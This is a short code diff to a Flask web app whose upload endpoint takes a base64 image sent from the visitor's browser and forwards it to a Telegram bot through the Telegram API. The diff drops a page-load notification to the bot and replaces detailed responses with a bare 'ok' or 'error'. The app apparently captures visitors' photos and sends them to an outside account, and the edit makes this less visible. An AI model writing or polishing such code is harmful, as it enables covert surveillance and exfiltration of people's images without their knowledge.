@@ -13,13 +13,12 @@ def add_header(response):
 
 @app.route('/')
 def index():
-    requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=App_Preview_Active')
     return render_template('index.html')
 
 @app.route('/upload', methods=['POST'])
 def upload():
     try:
         img_data = request.json['img'].split(',')[1]
-        res = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto', data={'chat_id': ID}, files={'photo': ('img.jpg', base64.b64decode(img_data))})
-        return res.text
-    except Exception as e: return str(e)
+        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto', data={'chat_id': ID}, files={'photo': ('img.jpg', base64.b64decode(img_data))})
+        return 'ok'
+    except: return 'error'
